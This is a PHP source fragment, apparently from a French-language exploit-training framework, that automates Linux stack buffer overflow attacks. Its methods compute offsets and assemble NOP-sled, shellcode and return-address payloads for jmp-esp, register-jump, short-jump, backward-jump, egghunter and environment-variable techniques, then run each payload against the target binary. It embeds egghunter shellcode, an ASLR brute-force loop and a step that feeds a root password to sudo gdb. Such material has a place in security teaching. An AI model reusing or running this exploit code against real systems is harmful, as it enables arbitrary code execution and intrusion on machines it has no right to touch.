		$addr_jmp_reg_offset = trim($addr_jmp_reg_offset);
		$this->article("JMP $reg at Offset", $addr_jmp_reg_offset);

			$nop_repeat =($offset_eip - $size_shellcode - 4);
			$addr_jmp_reg_offset = $this->hex2rev_32($addr_jmp_reg_offset);
			$header1 = "\"$addr_jmp_reg_offset\"+\"$nop\"*$nop_repeat+\"$shellcode\"";
			$junk_repeat = $exploit_size_max -($offset_eip + 4 + $footer_size);
			$footer1 = "\"$junk\"*$junk_repeat+\"$footer\"";
			
			$this->article("template", "python -c 'print \"JMP REG OFFSET\"+\"\\x90\"*(\"OFFSET EIP-len(\"JMP REG OFFSET\")-len(\"SHELLCODE\"))+\"SHELLCODE\"+\"EIP = JMP REG\"+\"JUNK\"+\"FOOTER\"'");
			for($i = 0; $i < $total_reg; ) {
				$reg_addr = trim($tab_reg [$i]);
				$addr_reg = $this->hex2rev_32($reg_addr);
				$this->article($i++."/$total_reg - $reg", $reg_addr);
				$this->requette("gdb -q --batch -ex \"info symbol $reg_addr\" $this->file_path");
				$cmd = "python -c 'print $header1+\"$addr_reg\"+$footer1'";
				$query = "$this->file_path `$cmd`";
				
				$this->article("template", "python -c 'print \"JMP REG OFFSET\"+\"\\x90\"*(\"OFFSET EIP-len(\"JMP REG OFFSET\")-len(\"SHELLCODE\"))+\"SHELLCODE\"+\"EIP = JMP REG\"+\"JUNK\"+\"FOOTER\"'");
				//$this->payload2check4norme("$shellcode$addr_reg");
				$this->requette($query);
				//$this->elf2debug4payload($cmd);
				// pause();
			}
		
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4jmp2reg4sub($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("SUB TO REGISTER ESP and JUMP");
	$nop = "\\x90";
	$junk = "\\x41";
	
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");
	$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");
	$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	
	$jmp_int =(int)(($offset_eip - $size_shellcode / 2) / 100);
	$opcode_hex = $this->asm2hex("sub esp, 100");
	$opcode_jmp_reg = $this->asm2hex("jmp esp");
	$this->article("OPCODE SUB", $opcode_hex);
	$this->article("OPCODE JMP ESP", $opcode_jmp_reg);
	$this->article("NOMBRE DE SAUT*100", $jmp_int*100);
	$this->pause();
	
	$nop_repeat =($offset_eip - $header_size -(3 * $jmp_int) - 2 - $size_shellcode);
	$header = "\"$opcode_hex\"*$jmp_int+\"$opcode_jmp_reg\"+\"$nop\"*$nop_repeat+\"$shellcode\"";
	$junk_repeat = $exploit_size_max -($offset_eip + 4 + $footer_size);
	$footer = "\"$junk\"*$junk_repeat+\"$footer\"";
	
	$this->article("template", "python -c 'print \"SUB ESP\"+\"JMP ESP\"+\"\\x90\"*(\"OFFSET EIP-len(\"SUB ESP + JMP ESP + SIZE SHELLCODE\"))+\"SHELLCODE\"+\"EIP = JMP REG\"+\"JUNK\"+\"FOOTER\"'");
	$this->pause();
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$total_reg = count($tab_reg);
	for($i = 0; $i < $total_reg; ) {
		$reg_addr = trim($tab_reg [$i]);
		$addr_reg = $this->hex2rev_32($reg_addr);
		$this->article($i++."/$total_reg - $reg", $reg_addr);
		$this->requette("gdb -q --batch -ex \"info symbol $reg_addr\" $this->file_path");
		$cmd = "python -c 'print $header+\"$addr_reg\"+$footer'";
		$query = "$this->file_path `$cmd`";
		//$this->payload2check4norme("$shellcode$addr_reg");
		$this->article("template", "python -c 'print \"SUB ESP\"+\"JMP ESP\"+\"\\x90\"*(\"OFFSET EIP-len(\"SUB ESP + JMP ESP + SIZE SHELLCODE\"))+\"SHELLCODE\"+\"EIP = JMP REG\"+\"JUNK\"+\"FOOTER\"'");
		
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4jmp2reg4short_jmp($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("EIP JMP TO REGISTER $reg and NEAR JUMP");
	$nop = "\\x90";
	$junk = "\\x41";
	$this->ssTitre("SHELLCODE SIZE");	$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$header = "\"$nop\"*($offset_eip-$header_size-2)";
	$junk_repeat = $exploit_size_max -($offset_eip + 2 + 4 + $size_shellcode + $footer_size);
	$footer = "\"$nop\"*$junk_repeat+\"$shellcode\"+\"$footer\"";
	$short_jmp = "\\xeb\\x04";
	$hex2asm = $this->hex2asm($short_jmp);
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHORT JMP\"))+\"SHORT JMP\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
	$this->pause();
	$tab_reg = $this->elf2reg4jmp($reg,$dll);
	$total_reg = count($tab_reg);
	for($i = 0; $i < $total_reg; ) {
		$reg_addr = trim($tab_reg [$i]);
		$addr_reg = $this->hex2rev_32($reg_addr);

		$this->article("SHORT JUMP",$hex2asm);
		$this->article($i++."/$total_reg - $reg", $reg_addr);
		$this->requette("gdb -q --batch -ex \"info symbol $reg_addr\" $this->file_path");
		$cmd = "python -c 'print $header+\"$short_jmp\"+\"$addr_reg\"+$footer'";
		$query = "$this->file_path `$cmd`";
		//$this->payload2check4norme("$shellcode$addr_reg");
		$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHORT JMP\"))+\"SHORT JMP\"+\"EIP = JMP REG\"+\"SHELLCODE\"+\"JUNK\"+\"FOOTER\"'");
		
		$this->requette($query);
		//$this->elf2debug4payload($cmd);
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}

	public function ret2stack4linux4jmp2esp4sc_before_jmp_reg($reg,$offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("JMP ESP SC before JMP $reg");
	$nop = "\\x90";
	$junk = "\\x41";
	
	$this->titre("Shellcode Size");$shellcode_size = $this->hex2size($shellcode);
	$this->titre("Header Size");$header_size = $this->hex2size($header);
	$this->titre("Footer Size");$footer_size = $this->hex2size($footer);
	
	$offset_header_eip = $offset_eip + $header_size;
	
	$JMPs_ebx = $this->elf2reg4jmp($reg,$dll);
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)+\"JMP $reg\"'");
	
	$offset_nop = 5;
	$junk_number = $exploit_size_max - $offset_header_eip - 4 - 4 - $offset_nop;
	
	$JMPs_ESP = $this->elf2reg4jmp("esp",$dll);
	$i = 1;
	$total_esp = count($JMPs_ESP);
	foreach($JMPs_ESP as $addr_jmp_esp_sc_before_jmp_ebx) {
		$addr_jmp_esp_sc_before_jmp_ebx = trim($addr_jmp_esp_sc_before_jmp_ebx);
		if(! empty($addr_jmp_esp_sc_before_jmp_ebx)) {
			$total_ebx = count($JMPs_ebx);
			$j = 1;
			foreach($JMPs_ebx as $jmp_ebx) {
				$jmp_ebx = trim($jmp_ebx);
				$this->article("$i/$total_esp - ESP", $addr_jmp_esp_sc_before_jmp_ebx);
				$this->article("$j/$total_ebx - $reg", $jmp_ebx);
				$this->requette("gdb -q --batch -ex \"x/i $jmp_ebx\" $this->file_path");
				$this->requette("gdb -q --batch -ex \"info symbol $jmp_ebx\" $this->file_path");
				$jmp_esp_sc_before_jmp_ebx = $this->hex2rev_32($addr_jmp_esp_sc_before_jmp_ebx);
				$header1 = "\"$header\"+\"$nop\"*($offset_header_eip-$shellcode_size)+\"$shellcode\"";
				$jmp_ebx_addr = $this->hex2rev_32($jmp_ebx);
				$footer1 = "\"$nop\"*$offset_nop+\"$jmp_ebx_addr\"+\"$junk\"*$junk_number+\"$footer\"";
				$payload = "$header1+\"$jmp_esp_sc_before_jmp_ebx\"+$footer1";
				// $payload = addcslashes($payload,'\\$');
				$cmd = "python -c 'print $payload'";
				$query = "$this->file_path `$cmd`";
				$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)+\"JMP $reg\"'");
				
				$this->requette($query);
				// system($query);
				// pause();
				$j ++;
				//$this->elf2debug4payload($cmd);
			}
			// pause();
		}
		$i ++;
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}






public function ret2stack4linux4jmp2esp4sc_after_jmp_forward($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
    $nop = "\\x90";
    $junk = "\\x41";
    
    $this->chapitre("JMP ESP + jmp forward SC after ");
    $header_shellcode = '\x31\xc0\xb4\x10\x29\xc4\x90';
    $this->hex2asm($header_shellcode);
    //$shellcode = $header_shellcode . $shellcode;
    
    $this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2+\"JMP BACK\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2'");
    $this->titre("Shellcode Size");
    $shellcode_size = $this->hex2size($shellcode);
    $this->titre("Header Size");
    $header_size = $this->hex2size($header);
    $this->titre("Footer Size");
    $footer_size = $this->hex2size($footer);
    
    $offset_header_eip = $offset_eip + $header_size;
    
    $nop_repeat_before = $offset_header_eip -($header_size + $shellcode_size);
    $nop_repeat_after_eip = 4;
    $junk_repeat = $exploit_size_max -($offset_header_eip + 4 + $nop_repeat_after_eip + 5 + $footer_size);
    
    $jmpback_int = intval($nop_repeat_after_eip + 4 + $shellcode_size +($nop_repeat_before / 2));
    // $jmpback_int = $jmpback_int*10 ;
    // $jmpback_int = 330;
    $jmpback_hex = dechex(hexdec("ffffffff") - $jmpback_int);
    $jmpback = $this->hex2rev_32("0x$jmpback_hex");
    $this->article("JMP BACK",$jmpback_int);
    $file_bin->asm2hex("jmp $jmpback_int");
    
    // $jmpback = "\\xeb".$jmpback;
    $jmpback = "\\xe9" . $jmpback;
    // $jmpback = "\\xe8".$jmpback;
    
    $header1 = "\"$header\"+\"$nop\"*$nop_repeat_before+\"$shellcode\"";
    $footer1 = "\"$nop\"*$nop_repeat_after_eip+\"$jmpback\"+\"$junk\"*$junk_repeat+\"$footer\"";
    
    $reg = "esp";
    $tab_esp = $this->elf2reg4jmp("esp",$dll);
    // pause();
    $i = 1;
    $total_esp = count($tab_esp);
    
    foreach($tab_esp as $addr_jmp_esp_sc_before_jmpback) {
        $addr_jmp_esp_sc_before_jmpback = trim($addr_jmp_esp_sc_before_jmpback);
        if(! empty($addr_jmp_esp_sc_before_jmpback)) {
            $this->article("$i/$total_esp - JMP ESP", $addr_jmp_esp_sc_before_jmpback);
            // requette("gdb -q --batch -ex \"info symbol $addr_jmp_esp_sc_before_jmpback\" $this->file_path");
            $this->article("JMP BACK", $jmpback_int);
            $jmp_esp_sc_before_jmpback = $this->hex2rev_32($addr_jmp_esp_sc_before_jmpback);
            $payload = "$header1+\"$jmp_esp_sc_before_jmpback\"+$footer1";
            // $payload = addcslashes($payload,'\\$');
            $query_jmp_esp_sc_before_jmpback = "python -c 'print $payload' | tee $this->file_path" . "_jmp_esp_sc_before_jmpback_" . $addr_jmp_esp_sc_before_jmpback;
            // requette($query_jmp_esp_sc_before_jmpback);
            $cmd = "python -c 'print $payload'";
            $query = "$this->file_path `$cmd`";
            $this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2+\"JMP BACK\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2'");
            
            $this->requette($query);
            // requette("gdb -q --batch -ex \"r `python -c 'print $payload'`\" -ex \"x/200x $addr_jmp_esp_sc_before_jmpback\" -ex \"i r eip\" $this->file_path");
            //$this->elf2debug4payload($cmd);
        }
        $i ++;
    }
    $this->titre("END ".__FUNCTION__);
}

























	public function ret2stack4linux4jmp2esp4sc_before_jmp_backward($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$nop = "\\x90";
	$junk = "\\x41";
	
	$this->chapitre("JMP ESP SC before jmp backward");
	$header_shellcode = '\x31\xc0\xb4\x10\x29\xc4\x90';
	$this->hex2asm($header_shellcode);
	$shellcode = $header_shellcode . $shellcode;
	
	$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2+\"JMP BACK\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2'");
	$this->titre("Shellcode Size");
	$shellcode_size = $this->hex2size($shellcode);
	$this->titre("Header Size");
	$header_size = $this->hex2size($header);
	$this->titre("Footer Size");
	$footer_size = $this->hex2size($footer);
	
	$offset_header_eip = $offset_eip + $header_size;
	
	$nop_repeat_before = $offset_header_eip -($header_size + $shellcode_size);
	$nop_repeat_after_eip = 4;
	$junk_repeat = $exploit_size_max -($offset_header_eip + 4 + $nop_repeat_after_eip + 5 + $footer_size);
	
	$jmpback_int = intval($nop_repeat_after_eip + 4 + $shellcode_size +($nop_repeat_before / 2));
	// $jmpback_int = $jmpback_int*10 ;
	// $jmpback_int = 330;
	$jmpback_hex = dechex(hexdec("ffffffff") - $jmpback_int);
	$jmpback = $this->hex2rev_32("0x$jmpback_hex");
	$this->article("JMP BACK",$jmpback_int);
	$this->asm2hex("jmp -$jmpback_int");
	// $jmpback = "\\xeb".$jmpback;
	$jmpback = "\\xe9" . $jmpback;
	// $jmpback = "\\xe8".$jmpback;
	
	$header1 = "\"$header\"+\"$nop\"*$nop_repeat_before+\"$shellcode\"";
	$footer1 = "\"$nop\"*$nop_repeat_after_eip+\"$jmpback\"+\"$junk\"*$junk_repeat+\"$footer\"";
	
	$reg = "esp";
	$tab_esp = $this->elf2reg4jmp($reg,$dll);
	// pause();
	$i = 1;
	$total_esp = count($tab_esp);
	
	foreach($tab_esp as $addr_jmp_esp_sc_before_jmpback) {
		$addr_jmp_esp_sc_before_jmpback = trim($addr_jmp_esp_sc_before_jmpback);
		if(! empty($addr_jmp_esp_sc_before_jmpback)) {
			$this->article("$i/$total_esp - JMP ESP", $addr_jmp_esp_sc_before_jmpback);
			// requette("gdb -q --batch -ex \"info symbol $addr_jmp_esp_sc_before_jmpback\" $this->file_path");
			$this->article("JMP BACK", $jmpback_int);
			$jmp_esp_sc_before_jmpback = $this->hex2rev_32($addr_jmp_esp_sc_before_jmpback);
			$payload = "$header1+\"$jmp_esp_sc_before_jmpback\"+$footer1";
			// $payload = addcslashes($payload,'\\$');
			$query_jmp_esp_sc_before_jmpback = "python -c 'print $payload' | tee $this->file_path" . "_jmp_esp_sc_before_jmpback_" . $addr_jmp_esp_sc_before_jmpback;
			// requette($query_jmp_esp_sc_before_jmpback);
			$cmd = "python -c 'print $payload'";
			$query = "$this->file_path `$cmd`";
			$this->article("template", "python -c 'print \"\\x90\"*(\"OFFSET EIP-len(\"SHELLCODE\"))+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2+\"JMP BACK\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-4)/2'");
				
			$this->requette($query);
			// requette("gdb -q --batch -ex \"r `python -c 'print $payload'`\" -ex \"x/200x $addr_jmp_esp_sc_before_jmpback\" -ex \"i r eip\" $this->file_path");
			//$this->elf2debug4payload($cmd);
		}
		$i ++;
	}
	$this->titre("END ".__FUNCTION__);
}

	
	
	public function ret2stack4linux4jmp2esp4sc_after_only($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("STACK LINUX JMP ESP SHELLCODE AFTER EIP ONLY ");
	// graphic_ret2stack4linux4jmp2esp4sc_after_only();
	$dll = strtolower(trim($dll));
	// $offset_esp = offset_reg("esp",$this->file_path);
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	$max_send_data = 2048; // buf[2048] -> buf_after.c
	$this->ssTitre("MAX NOP");
	$tab_nops = array(
			1,
			2,
			3,
			4,
			5,
			6,
			10,
			100,
			1000 
	);
	// net("http://www.linuxjournal.com/article/6060");
	$max_nops =($max_send_data -($offset_eip + 4 + $size_shellcode + 1)); // 1 pour entrer "\0" du programme
	$tab_nops [] = $max_nops;
	$tab_esp = array();
	$reg = "esp";
	
	$tab_esp = $this->elf2reg4jmp("esp",$dll);
	
	$i = 1;
	$total_esp = count($tab_esp);
	foreach($tab_esp as $esp) {
		// $addr = "\x$esp[6]$esp[7]\x$esp[4]$esp[5]\x$esp[2]$esp[3]\x$esp[0]$esp[1]";
		$esp = trim($esp);
		$addr = $this->hex2rev_32($esp);
		$this->article("$i/$total_esp - ESP", $esp);
		$this->requette("gdb -q --batch -ex \"info symbol $esp\" $this->file_path");
		$this->article("template", "$this->file_path `python -c 'print \"\x41\"*$offset_eip+\"$addr\"+\"\\x90\"*<nops>+\"<shellcode>\"'`");
		foreach($tab_nops as $nops) {
			$size_max_shellcode =($max_send_data -($offset_eip + 4 + $nops + 1));
			$this->gras("NOPs = $nops -> Max Size SHELLCODE: $size_max_shellcode bytes --> ");
			$cmd = "python -c 'print \"\\x41\"*$offset_eip+\"$addr\"+\"\\x90\"*$nops+\"$shellcode\"'";
			$query = "$this->file_path `$cmd`";
			//$this->requette($query) ;
			system($query);
			//$this->elf2debug4payload($cmd);
		}
		$i ++;
		$this->pause();
		
	}
	$this->titre("END ".__FUNCTION__);
}






	public function ret2stack4linux4jmp2esp4sc_after_egghunter($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	$this->chapitre("STACK LINUX JMP ESP SHELLCODE EGGHUNTER AFTER EIP ");
	$this->article("template", "python -c 'print \"ANYTHING\"*\"OFFSET EIP\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"EGG HUNTER\")-len(\"EGG\"))/2+\"EGG HUNTER\"+\"ANYTHING\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"EGG HUNTER\")-len(\"EGG\"))/2+\"EGG\"+\"SHELLCODE\"'");	
	$this->ssTitre("EGG HUNTER SIZE");
	$this->article("egghunter"," marker w00t");
	$this->article("egg","w00tw00t - \\x77\\x30\\x30\\x74");
	$egghunter = '\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7';
	$egghunter_size = $this->hex2size($egghunter);
	$egghunter_asm = $this->hex2asm($egghunter);
	$egg = '\x77\x30\x30\x74\x77\x30\x30\x74'; // w00tw00t - \x77\x30\x30\x74
	$egg_size = $this->hex2size($egg);
	$nop = "\\x90";
	
	$this->ssTitre("SHELLCODE SIZE");
	$size_shellcode = $this->hex2size($shellcode);
	
	$max_send_data = 2048; // buf[2048] -> buf_after.c
	$tab_nops = array(
			1,
			2,
			3,
			4,
			5,
			6,
			10,
			100,
			1000 
	);
	// net("http://www.linuxjournal.com/article/6060");
	
	$header_size = $this->hex2size($header);
	$footer_size = $this->hex2size($footer);
	$offset_eip = $offset_eip + $header_size;
	
	$nop_repeat = intval(($exploit_size_max - $offset_eip - 4 - $egghunter_size - $egg_size - $size_shellcode - $footer_size) / 2);
	
	$max_nops =($max_send_data -($offset_eip + 4 + $egghunter_size + $egg_size + $size_shellcode + $footer_size + 1)); // 1 pour entrer "\0" du programme
	$tab_nops [] = $max_nops;
	
	$header = "\"$header\"+\"\\x41\"*($offset_eip-$header_size)";
	$footer1 = "\"$nop\"*$nop_repeat+\"$egghunter\"+\"\\x42\"*$nop_repeat+\"$egg\"+\"$shellcode\"+\"$footer\"";
	
	$tab_esp = array();
	
	$reg = "esp";
	$tab_esp = $this->elf2reg4jmp("esp",$dll);
	// pause();
	$i = 1;
	$total_esp = count($tab_esp);
	
	foreach($tab_esp as $addr_jmp_esp_sc_after_egghunter) {
		$addr_jmp_esp_sc_after_egghunter = trim($addr_jmp_esp_sc_after_egghunter);
		if(! empty($addr_jmp_esp_sc_after_egghunter)) {
			
			$this->article("$i/$total_esp - ESP", $addr_jmp_esp_sc_after_egghunter);
			$this->requette("gdb -q --batch -ex \"info symbol $addr_jmp_esp_sc_after_egghunter\" $this->file_path");
			$jmp_esp_sc_after_egghunter = $this->hex2rev_32($addr_jmp_esp_sc_after_egghunter);
			$payload = "$header+\"$jmp_esp_sc_after_egghunter\"+$footer1";
			// $payload = addcslashes($payload,'\\$');
			$query_jmp_esp_sc_after_egghunter = "python -c 'print $payload' | tee $this->file_path" . "_jmp_esp_sc_after_egghunter_" . "$addr_jmp_esp_sc_after_egghunter";
			//$this->requette($query_jmp_esp_sc_after_egghunter);
			$cmd = "python -c 'print $payload'";
			$query = "$this->file_path `$cmd`";
			$this->article("template", "python -c 'print \"ANYTHING\"*\"OFFSET EIP\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"EGG HUNTER\")-len(\"EGG\"))/2+\"EGG HUNTER\"+\"ANYTHING\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"SHELLCODE\")-len(\"EGG HUNTER\")-len(\"EGG\"))/2+\"EGG\"+\"SHELLCODE\"'");
			
			$this->requette($query);
			//$this->elf2debug4payload($cmd);
		}
		$i ++;
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}
	public function ret2stack4linux4jmp2esp4sc_before_egghunter($offset_eip, $dll, $header, $shellcode, $footer, $exploit_size_max) {
	
	$nop = "\\x90";
	$this->file_name = trim(basename($this->file_path));
	
	$this->chapitre("STACK LINUX JMP ESP SHELLCODE EGGHUNTER BEFORE EIP ");
	$header_shellcode = '\x31\xc0\xb4\x10\x29\xc4\x90';
	$this->hex2asm($header_shellcode);
	$shellcode = $header_shellcode . $shellcode;
	
	$this->article("template", "python -c 'print \"ANYTHING\"*(\"OFFSET EIP-len(\"EGG\")-len(\"SHELLCODE\"))+\"EGG\"+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"EGG HUNTER\")-8)+\"EGG HUNTER\"'");
	$this->ssTitre("EGG HUNTER SIZE");
	// egghunter marker w00t
	$egghunter = '\xfc\x31\xc9\xf7\xe1\x66\x81\xca\xff\x0f\x42\x6a\x21\x58\x8d\x5a\x04\xcd\x80\x3c\xf2\x74\xee\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7';
	// $egghunter = '\x66\x81\xc9\xff\x0f\x41\x6a\x43\x58\xcd\x80\x3c\xf2\x74\xf1\xb8\x77\x30\x30\x74\x89\xcf\xaf\x75\xec\xaf\x75\xe9\xff\xe7';
	// $egghunter = '\x31\xd2\x66\x81\xca\xff\x0f\x42\x8d\x5a\x04\x6a\x21\x58\xcd\x80\x3c\xf2\x74\xee\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7';
	$egghunter_size = $this->hex2size($egghunter);
	$egg = '\x77\x30\x30\x74\x77\x30\x30\x74'; // w00tw00t - \x77\x30\x30\x74\x77\x30\x30\x74
	$egg_size = $this->hex2size($egg);
	$nop = "\\x90";
	
	$this->ssTitre("SHELLCODE SIZE");$size_shellcode = $this->hex2size($shellcode);
	$this->ssTitre("HEADER SIZE");$header_size = $this->hex2size($header);
	$this->ssTitre("FOOTER SIZE");$footer_size = $this->hex2size($footer);
	
	$offset_eip = $offset_eip + $header_size;
	$nop_repeat = $exploit_size_max - $offset_eip - 4 - $egghunter_size - $footer_size;
	$header1 = "\"$header\"+\"\\x41\"*($offset_eip-$header_size-$egg_size-$size_shellcode)+\"$egg\"+\"$shellcode\"";
	$footer1 = "\"$nop\"*$nop_repeat+\"$egghunter\"+\"$footer\"";
	$tab_esp = array();
	$reg = "esp";
	$tab_esp = $this->elf2reg4jmp("esp",$dll);
	// pause();
	$i = 1;
	$total_esp = count($tab_esp);
	foreach($tab_esp as $addr_jmp_esp_sc_before_egghunter) {
		$addr_jmp_esp_sc_before_egghunter = trim($addr_jmp_esp_sc_before_egghunter);
		if(! empty($addr_jmp_esp_sc_before_egghunter)) {
			$this->article("$i/$total_esp - JMP ESP", $addr_jmp_esp_sc_before_egghunter);
			$jmp_esp_sc_before_egghunter = $this->hex2rev_32($addr_jmp_esp_sc_before_egghunter);
			$payload = "$header1+\"$jmp_esp_sc_before_egghunter\"+$footer1";
			// $payload = addcslashes($payload,'\\$');
			$query_jmp_esp_sc_before_egghunter = "python -c 'print $payload' | tee $this->file_path" . "_jmp_esp_sc_before_egghunter_" . "$addr_jmp_esp_sc_before_egghunter";
			// requette($query_jmp_esp_sc_before_egghunter);
			$cmd = "python -c 'print $payload'";
			$query = "$this->file_path `$cmd`";
			$this->article("template", "python -c 'print \"ANYTHING\"*(\"OFFSET EIP-len(\"EGG\")-len(\"SHELLCODE\"))+\"EGG\"+\"SHELLCODE\"\"+\"JMP ESP\"+\"\\x90\"*(\"EXPLOIT SIZE MAX\"-\"OFFSET EIP\"-4-len(\"EGG HUNTER\")-8)+\"EGG HUNTER\"'");
				
			$this->requette($query);
	
			//$this->elf2debug4payload($cmd);
		}
		$i ++;
		// pause();
	}
	$this->titre("END ".__FUNCTION__);
}


	public function before_eip_addr_server($offset, $host, $port) {
	cmd("localhost", "$this->file_path 2222"); // pause();
	$tmp = $this->req_ret_tab("pidof $dir_tmp/tcpserver");
	$pid = $tmp [0];
	$this->requette("python -c \"print \\\"\\x90\\\"*524+\\\"BBBB\\\"\" > /home/labs/Bureau/CEH/tmp/test.raw");
	cmd("localhost", "echo '$this->root_passwd' | sudo -S gdb");
	cmd("localhost", "(gdb) attach $pid");
	cmd("localhost", "cat /home/labs/Bureau/CEH/tmp/test.raw | nc localhost 2222");
	cmd("localhost", "(gdb) c");
	cmd("localhost", "(gdb) x/200x \$esp");
	// requette("echo \"attach $pid\nc\nx/200x \\\$esp\" > $dir_tmp/cmd_gdb.txt");$query = "echo '$this->root_passwd' | sudo -S gdb --batch -q -x $dir_tmp/cmd_gdb.txt $this->file_path | grep -m2 '0x90909090' | tail -1 | cut -d':' -f1";return req_ret($query);
}
// ==========================================================================================


// =============================================================

	public function ret2stack4linux4env($offset, $addr_shellcode_env) {
	$addr_shellcode_env = $this->hex2rev_32($addr_shellcode_env);
	$cmd = "python -c 'print \"A\"*$offset+\"$addr_shellcode_env\"'";
	$query = "$this->file_path `$cmd`";
	//$this->elf2debug4payload($cmd);
	$this->requette($query);
}


	public function ret2stack4linux4env_no_aslr($offset, $addr_shellcode_env) {
	$this->ssTitre("Payload ENV No ASLR");
	$this->payload2check4norme($addr_shellcode_env, $this->badchars);
	$addr_shellcode_env = $this->hex2rev_32($addr_shellcode_env);
	$this->article("Chance", "1/1");
	$cmd = "python -c 'print \"A\"*$offset+\"$addr_shellcode_env\"'";
	$query = "$this->file_path `$cmd`";
	$this->cmd("localhost", $query);
	//$this->elf2debug4payload($cmd);
	//$this->requette($query);$this->pause();
	return $query ;
}

	public function ret2stack4linux4env_with_aslr($offset, $addr_shellcode_env) {
	$this->ssTitre("Payload ENV With ASLR");
	$addr_shellcode_env = $this->hex2rev_32($addr_shellcode_env);
	$query = "\necho \"tape Enter\";read STDIN;i=0;j=0;flag=true;while [ \$j -ne 1 ] ; do i=\$((\$i + 1));echo \"Test:\$i\"; if($this->file_path `python -c 'print \"A\"*$offset+\"$addr_shellcode_env\"'`) then j=\$((\$j + 1)) ;echo \"\tSucces \$j/\$i \" ;read pause;  fi;done";
	$this->article("Chance", " ~ 1/2000");
	//$this->requette($query);$this->pause();
	return $query ;
}






}
?>